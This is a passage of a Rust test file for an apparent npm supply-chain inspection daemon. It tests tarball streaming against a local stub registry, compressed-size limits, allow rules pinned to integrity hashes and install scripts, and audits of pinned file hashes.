                    "tarball": format!("http://{address}/widget/-/widget-1.1.0.tgz"),
                    "fileCount": 3,
                    "unpackedSize": 4096
                }
            }
        }
    })
}

/// Bind port 0, build the packument around the address we actually got, then serve both.
async fn stub_registry(
    tarball_bytes: Vec<u8>,
) -> (std::net::SocketAddr, tokio::task::JoinHandle<()>) {
    use axum::extract::State;
    use axum::response::IntoResponse;
    use axum::routing::get;

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind stub");
    let address = listener.local_addr().expect("stub address");
    let state = (Arc::new(stub_packument(address)), Arc::new(tarball_bytes));

    let app = axum::Router::new()
        .route(
            "/{package}",
            get(
                |State((packument, _)): State<(Arc<Value>, Arc<Vec<u8>>)>| async move {
                    axum::Json((*packument).clone())
                },
            ),
        )
        .route(
            "/{package}/-/{file}",
            get(
                |State((_, tarball)): State<(Arc<Value>, Arc<Vec<u8>>)>| async move {
                    (
                        [(axum::http::header::CONTENT_TYPE, "application/octet-stream")],
                        (*tarball).clone(),
                    )
                        .into_response()
                },
            ),
        )
        .with_state(state);

    let handle = tokio::spawn(async move {
        let _ = axum::serve(listener, app).await;
    });
    (address, handle)
}

fn service_against(address: std::net::SocketAddr, limits: TarballLimits) -> ControlService {
    let config = Config {
        upstream: format!("http://{address}"),
        listen: "127.0.0.1:1".parse().expect("valid address"),
        ..Config::default()
    };
    let store = Arc::new(Store::open_in_memory().expect("in-memory store"));
    ControlService::new(Arc::new(config), store)
        .expect("service builds")
        .with_limits(limits)
}

#[tokio::test]
async fn inspect_streams_a_real_tarball_over_http_and_reports_the_script_delta() {
    let manifest = json!({
        "name": "widget", "version": "1.1.0",
        "scripts": { "preinstall": "node setup.mjs", "test": "mocha" }
    })
    .to_string()
    .into_bytes();
    let bytes = tarball(&[
        ("package/package.json", &manifest),
        ("package/index.js", b"module.exports = 1;\n"),
        ("package/lib/big.bin", &vec![5u8; 100_000]),
    ]);

    let (address, handle) = stub_registry(bytes).await;
    let service = service_against(address, TarballLimits::default());
    let report = service
        .inspect("widget", None)
        .await
        .expect("inspect succeeds");
    handle.abort();

    assert_eq!(report.version, "1.1.0");
    assert_eq!(report.version_source, "dist-tags.latest");
    assert_eq!(report.dist_integrity.as_deref(), Some("sha512-TWO"));
    assert_eq!(report.install_hooks.len(), 1);
    assert_eq!(report.install_hooks[0].command, "node setup.mjs");
    assert!(report.scripts_match_packument);
    assert!(
        report.script_delta.newly_acquires_install_hooks,
        "1.0.0 ran no install hook: {:?}",
        report.script_delta
    );
    assert_eq!(
        report.script_delta.previous_version.as_deref(),
        Some("1.0.0")
    );
    assert_eq!(report.file_count.observed, 3);
    assert_eq!(report.file_count.registry, Some(3));
    assert_eq!(
        report.unpacked_size.observed,
        100_000 + 20 + u64::try_from(manifest.len()).expect("size fits")
    );
    assert!(report.compressed_bytes > 0);
    assert_eq!(report.npm_user.as_deref(), Some("publisher"));
    assert!(!report.provenance.attested);
    assert_eq!(
        report.maintainers,
        vec!["someone <someone@example.test>".to_owned()]
    );
    // The stub publishes 1.1.0 on a fixed date and `inspect` reads the wall clock, so the
    // expected age is computed rather than hard-coded — otherwise this test starts failing at
    // midnight.
    let published = DateTime::parse_from_rfc3339("2026-07-25T00:00:00.000Z")
        .expect("fixture timestamp")
        .with_timezone(&Utc);
    assert_eq!(
        report.age_days,
        Some(Utc::now().signed_duration_since(published).num_days())
    );
}

#[tokio::test]
async fn a_streamed_tarball_that_blows_the_compressed_limit_is_abandoned() {
    let manifest = json!({ "name": "widget", "version": "1.1.0" })
        .to_string()
        .into_bytes();
    // Bytes gzip cannot shrink below the limit, so the compressed guard is what fires.
    let mut state: u64 = 0x2545_f491_4f6c_dd1d;
    let blob: Vec<u8> = (0..200_000)
        .map(|_| {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            u8::try_from(state & 0xff).unwrap_or(0)
        })
        .collect();
    let bytes = tarball(&[
        ("package/package.json", &manifest),
        ("package/blob.bin", &blob),
    ]);
    assert!(bytes.len() > 64 * 1024, "fixture is {} bytes", bytes.len());

    let (address, handle) = stub_registry(bytes).await;
    let service = service_against(
        address,
        TarballLimits {
            max_compressed_bytes: 4096,
            ..TarballLimits::default()
        },
    );
    let outcome = service.inspect("widget", Some("1.1.0")).await;
    handle.abort();

    let error = match outcome {
        Ok(_) => panic!("an oversized tarball must not be inspected"),
        Err(error) => error,
    };
    assert!(error.to_string().contains("compressed limit"), "{error}");
}

#[tokio::test]
async fn allow_pins_to_the_integrity_and_scripts_the_registry_currently_publishes() {
    let (address, handle) = stub_registry(tarball(&[("package/package.json", b"{}")])).await;
    let service = service_against(address, TarballLimits::default());

    let written = service
        .allow(
            "widget",
            "1.1.0",
            Some("reviewed the preinstall".to_owned()),
            &[],
            &actor(),
        )
        .await
        .expect("allow succeeds");

    assert_eq!(written.rule.verdict, "allow");
    assert_eq!(written.rule.integrity.as_deref(), Some("sha512-TWO"));
    assert_eq!(written.rule.scripts.len(), 1);
    assert_eq!(written.rule.scripts[0].hook, "preinstall");
    assert_eq!(written.rule.scripts[0].command, "node setup.mjs");
    assert_eq!(
        written.rule.actor.as_deref(),
        Some("uid=1000 pid=4242 via=mcp")
    );
    assert!(
        written.effect.contains("node setup.mjs"),
        "{}",
        written.effect
    );

    // The daemon's own engine now admits the version it was withholding.
    let packument = stub_packument(address);
    handle.abort();
    let outcome = policy::evaluate(
        &packument,
        service.store().as_ref(),
        service.store().as_ref(),
        &PolicyConfig::default(),
        now(),
    )
    .expect("policy runs");
    assert!(
        outcome.surviving_versions().contains(&"1.1.0".to_owned()),
        "{:?}",
        outcome.blocked
    );
}

#[tokio::test]
async fn inspecting_a_version_that_was_never_published_is_a_parameter_error() {
    let (address, handle) = stub_registry(tarball(&[("package/package.json", b"{}")])).await;
    let service = service_against(address, TarballLimits::default());
    let outcome = service.inspect("widget", Some("9.9.9")).await;
    handle.abort();

    let error = match outcome {
        Ok(_) => panic!("an unpublished version must be rejected"),
        Err(error) => error,
    };
    assert!(error.to_string().contains("9.9.9"), "{error}");
}

// -- pin audit ------------------------------------------------------------------------------

fn digest(path: &str, sha256: &str) -> crate::mcp::inspect::FileDigest {
    crate::mcp::inspect::FileDigest {
        path: path.to_owned(),
        sha256: sha256.to_owned(),
        size: 1,
    }
}

/// The case pinning exists for: the hook command is unchanged, so the script delta reports
/// nothing, but the file that command runs has different bytes.
#[test]
fn a_changed_pinned_file_is_reported_even_when_the_command_did_not_move() {
    let pinned = std::collections::BTreeMap::from([
        ("install.js".to_owned(), "a".repeat(64)),
        ("lib/util.js".to_owned(), "b".repeat(64)),
    ]);
    let files = vec![
        digest("install.js", &"c".repeat(64)),
        digest("lib/util.js", &"b".repeat(64)),
    ];

    let audit = crate::mcp::inspect::pin_audit("0.25.12", &pinned, &files);

    assert_eq!(audit.unchanged, vec!["lib/util.js".to_owned()]);
    assert_eq!(audit.changed.len(), 1);
    assert_eq!(audit.changed[0].path, "install.js");
    assert_eq!(audit.changed[0].pinned_sha256, "a".repeat(64));
    assert_eq!(audit.changed[0].observed_sha256, "c".repeat(64));
    assert!(audit.missing.is_empty());
    assert!(
        audit.summary.contains("install.js"),
        "the summary must name the file that moved: {}",
        audit.summary
    );
}

/// A pinned path the new version does not ship at all is neither "same" nor "changed" — it is
/// a third answer, and collapsing it into either would be a lie.
#[test]
fn a_pinned_path_the_version_does_not_publish_is_reported_as_missing() {
    let pinned = std::collections::BTreeMap::from([("install.js".to_owned(), "a".repeat(64))]);

    let audit =
        crate::mcp::inspect::pin_audit("1.0.0", &pinned, &[digest("index.js", &"d".repeat(64))]);

    assert!(audit.unchanged.is_empty());
    assert!(audit.changed.is_empty());
    assert_eq!(audit.missing, vec!["install.js".to_owned()]);
}

#[test]
fn an_all_matching_audit_says_so_without_qualification() {
    let pinned = std::collections::BTreeMap::from([("install.js".to_owned(), "a".repeat(64))]);

    let audit =
        crate::mcp::inspect::pin_audit("1.0.0", &pinned, &[digest("install.js", &"a".repeat(64))]);

    assert_eq!(audit.unchanged, vec!["install.js".to_owned()]);
    assert!(audit.changed.is_empty() && audit.missing.is_empty());
    assert!(
        audit.summary.contains("byte-identical"),
        "{}",
        audit.summary
    );
}

/// The daemon must never claim more than it checked: comparing command strings says nothing
/// about the files those commands run, and the wording has to admit that. This is the
/// companion to [`identical_hooks_report_no_change`], which checks the same summary from the
/// other side.
#[test]
fn an_unchanged_command_delta_does_not_claim_the_files_are_unchanged() {
    let previous = crate::store::ScriptSet::from_hooks([("postinstall", "node install.js")]);
    let current = crate::store::ScriptSet::from_hooks([("postinstall", "node install.js")]);

    let delta = crate::mcp::inspect::script_delta(Some(("1.0.0", &previous)), &current);

    assert!(delta.changed.is_empty() && delta.added.is_empty());
    assert!(
        !delta.summary.contains("byte-identical"),
        "an identical command string is not a byte-identical package: {}",
        delta.summary
    );
    assert!(
        delta.summary.contains("not compared"),
        "the summary must state what was NOT checked: {}",
        delta.summary
    );
}
